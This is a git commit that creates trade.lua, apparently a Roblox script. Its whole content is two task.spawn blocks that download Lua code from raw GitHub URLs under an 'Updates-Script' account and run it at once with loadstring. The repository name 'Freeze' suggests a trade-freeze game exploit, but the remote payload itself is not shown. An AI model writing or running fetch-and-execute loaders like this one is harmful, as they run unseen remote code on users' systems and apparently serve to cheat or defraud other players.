164600983b1f8dc42d0f302e4d09d7ffa50b0720
Updates-Script <cutenies123@gmail.com>
2025-08-13 11:44:31 +0800

    Create trade.lua

---
+++ trade.lua
@@ -0,0 +1,7 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Updates-Script/Freeze/refs/heads/main/trade.lua"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua"))()
+end)
